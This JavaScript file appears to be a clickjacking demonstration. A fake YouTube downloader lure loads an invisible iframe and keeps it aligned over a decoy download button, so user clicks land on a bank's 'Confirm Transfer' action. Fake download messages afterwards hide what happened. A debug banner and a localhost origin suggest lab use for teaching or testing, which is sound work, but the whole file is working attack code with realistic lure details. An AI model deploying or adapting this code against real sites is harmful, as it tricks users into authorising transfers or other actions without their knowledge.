/**
 * inject.js — Clickjacking auto-align and dynamic fetcher
 */

(function () {
  "use strict";

  // ── Fallback configuration ─────────────────────────────────────────────
  var FALLBACK_BUTTON_TOP  = 777;
  var FALLBACK_BUTTON_LEFT = 889;

  // ── Runtime state ──────────────────────────────────────────────────────
  var calibration     = loadCalibration();
  var autoCalibrated  = false;
  var iframeVisible   = false;

  // ── Element references ─────────────────────────────────────────────────
  var iframe     = document.getElementById("evil-iframe");
  var decoyBtn   = document.getElementById("decoy-btn");
  var submitArea = decoyBtn ? decoyBtn.parentElement : null;

  var ytInput    = document.getElementById("yt-input");
  var fetchBtn   = document.getElementById("fetch-btn");
  var loader     = document.getElementById("loader");
  var resultCard = document.getElementById("result-card");
  var vidThumb   = document.getElementById("vid-thumb");
  var vidTitle   = document.getElementById("vid-title");

  // Prevent iframe from loading initially until video is fetched
  // This helps realism, the user sees nothing loading until they act
  if (iframe) {
    iframe.dataset.src = iframe.src;
    iframe.src = "about:blank";
  }

  // ── Inject debug UI elements ───────────────────────────────────────────
  var banner = document.createElement("div");
  banner.id = "debug-banner";
  banner.textContent = "DEBUG MODE  —  Red outline shows the invisible iframe. Decoy button dimmed. D hide, Shift+Arrows tune.";
  document.body.insertBefore(banner, document.body.firstChild);

  var statusPanel = document.createElement("div");
  statusPanel.id = "debug-panel";
  document.body.appendChild(statusPanel);

  // ── YouTube Fetch Logic ────────────────────────────────────────────────
  if (fetchBtn && ytInput) {
    fetchBtn.addEventListener("click", handleFetch);
    ytInput.addEventListener("keypress", function(e) {
      if (e.key === "Enter") handleFetch();
    });
  }

  function handleFetch() {
    var rawUrl = ytInput.value.trim();
    if (!rawUrl) return;

    var videoId = extractVideoID(rawUrl);
    
    // Hide results, show loader
    resultCard.style.display = "none";
    loader.classList.add("active");

    // Load iframe now that user is engaged (starts the 2s auto-login in background)
    if (!iframeVisible && iframe) {
      iframe.src = iframe.dataset.src;
      iframeVisible = true;
    }

    if (videoId) {
      // Real YouTube fetching via oEmbed API proxy
      fetch("https://noembed.com/embed?url=https://www.youtube.com/watch?v=" + videoId)
        .then(res => res.json())
        .then(data => {
          showResult(data.title || "YouTube Video", "https://img.youtube.com/vi/" + videoId + "/hqdefault.jpg");
        })
        .catch(() => {
          showResult("High Quality YouTube Video", "https://img.youtube.com/vi/" + videoId + "/hqdefault.jpg");
        });
    } else {
      // Fake it if they put a generic non-YT URL
      setTimeout(function() {
        showResult("Fetched Multimedia Video", "https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&q=80");
      }, 1200);
    }
  }

  function showResult(title, thumbUrl) {
    loader.classList.remove("active");
    vidTitle.textContent = title;
    vidThumb.src = thumbUrl;
    resultCard.style.display = "flex";
    
    // Crucial: Re-align iframe as the decoy button has moved/appeared
    setTimeout(alignIframe, 50);
  }

  function extractVideoID(url) {
    var regExp = /^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#&?]*).*/;
    var match = url.match(regExp);
    return (match && match[7].length == 11) ? match[7] : false;
  }


  // ── postMessage auto-calibration ───────────────────────────────────────
  window.addEventListener("message", function (event) {
    if (event.origin !== "http://localhost:8001") return;

    var data = event.data;
    if (!data || data.type !== "clickjack-coords") return;

    var newTop  = toNumber(data.centerY, FALLBACK_BUTTON_TOP);
    var newLeft = toNumber(data.centerX, FALLBACK_BUTTON_LEFT);

    if (!autoCalibrated) {
      autoCalibrated = true;
      console.log("[AUTO-CALIBRATE] Coords received:", newLeft, newTop);
    }

    calibration.buttonTop  = newTop;
    calibration.buttonLeft = newLeft;
    saveCalibration();
    alignIframe();
  });

  // ── Align iframe ───────────────────────────────────────────────────────
  function alignIframe() {
    if (!iframe || !decoyBtn || resultCard.style.display === "none") return;

    var rect = decoyBtn.getBoundingClientRect();
    if (rect.width === 0) return; // Not visible yet

    var decoyCentreX = rect.left + rect.width  / 2;
    var decoyCentreY = rect.top  + rect.height / 2;

    iframe.style.left = (decoyCentreX - calibration.buttonLeft) + "px";
    iframe.style.top  = (decoyCentreY - calibration.buttonTop)  + "px";

    renderDebugState();
  }

  window.addEventListener("resize", alignIframe);
  window.addEventListener("scroll", alignIframe);

  // ── Click intercept log ────────────────────────────────────────────────
  function handleAttackClick(e) {
    console.group("[ATTACKER] Click intercepted via YouTube Downloader Lure");
    console.log("Coordinates :", e.clientX, e.clientY);
    console.log("Forwarded to:", "NorthPoint Bank — Confirm Transfer");
    console.groupEnd();

    // Complete the attack illusion:
    // Hide the iframe immediately and show a fake download progress
    setTimeout(function() {
      if (iframe) iframe.style.pointerEvents = "none";
      if (decoyBtn) {
        decoyBtn.textContent = "Downloading...";
        decoyBtn.style.backgroundColor = "#eab308"; // yellow
        
        setTimeout(function() {
          decoyBtn.textContent = "Processing HD Video...";
          setTimeout(function() {
            decoyBtn.textContent = "Download Complete!";
            decoyBtn.style.backgroundColor = "#3b82f6"; // blue
            showResult("Successful Simulation", "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&q=80");
          }, 1500);
        }, 1500);
      }
    }, 500);
  }

  if (submitArea) {
    submitArea.addEventListener("click", handleAttackClick, true);
  }

  if (iframe) {
    iframe.addEventListener("click", handleAttackClick, true);
    iframe.addEventListener("pointerdown", handleAttackClick, true);
  }

  // ── Keyboard controls ──────────────────────────────────────────────────
  document.addEventListener("keydown", function (e) {
    if (e.key.toLowerCase() === "d" && !isInput(e)) {
      document.body.classList.toggle("debug-mode");
      renderDebugState();
      return;
    }

    if (e.shiftKey && ["ArrowUp","ArrowDown","ArrowLeft","ArrowRight"].indexOf(e.key) !== -1) {
      e.preventDefault();
      if (e.key === "ArrowUp")    calibration.buttonTop  -= 2;
      if (e.key === "ArrowDown")  calibration.buttonTop  += 2;
      if (e.key === "ArrowLeft")  calibration.buttonLeft -= 2;
      if (e.key === "ArrowRight") calibration.buttonLeft += 2;
      saveCalibration();
      alignIframe();
      return;
    }

    if (e.key.toLowerCase() === "r" && !isInput(e)) {
      calibration.buttonTop  = FALLBACK_BUTTON_TOP;
      calibration.buttonLeft = FALLBACK_BUTTON_LEFT;
      autoCalibrated = false;
      saveCalibration();
      alignIframe();
    }
  });

  // ── Helpers ────────────────────────────────────────────────────────────
  function isInput(e) {
    if (!e || !e.target) return false;
    var tag = e.target.tagName.toLowerCase();
    return tag === "input" || tag === "textarea" || tag === "select" || e.target.isContentEditable;
  }

  function loadCalibration() {
    try {
      var raw = localStorage.getItem("clickjack-demo-calibration");
      if (!raw) return { buttonTop: FALLBACK_BUTTON_TOP, buttonLeft: FALLBACK_BUTTON_LEFT };
      var p = JSON.parse(raw);
      return { buttonTop: toNumber(p.buttonTop, FALLBACK_BUTTON_TOP), buttonLeft: toNumber(p.buttonLeft, FALLBACK_BUTTON_LEFT) };
    } catch (_) { return { buttonTop: FALLBACK_BUTTON_TOP, buttonLeft: FALLBACK_BUTTON_LEFT }; }
  }

  function saveCalibration() {
    try { localStorage.setItem("clickjack-demo-calibration", JSON.stringify(calibration)); } catch (_) {}
  }

  function toNumber(val, fallback) {
    var n = Number(val);
    return isFinite(n) ? n : fallback;
  }

  function renderDebugState() {
    if (!statusPanel) return;
    statusPanel.innerHTML =
      "<strong>top</strong>=" + Math.round(calibration.buttonTop) +
      "px &nbsp; <strong>left</strong>=" + Math.round(calibration.buttonLeft) +
      "px &nbsp;|&nbsp; auto=" + autoCalibrated +
      " &nbsp;|&nbsp; iframeLoaded=" + iframeVisible;
  }

})();
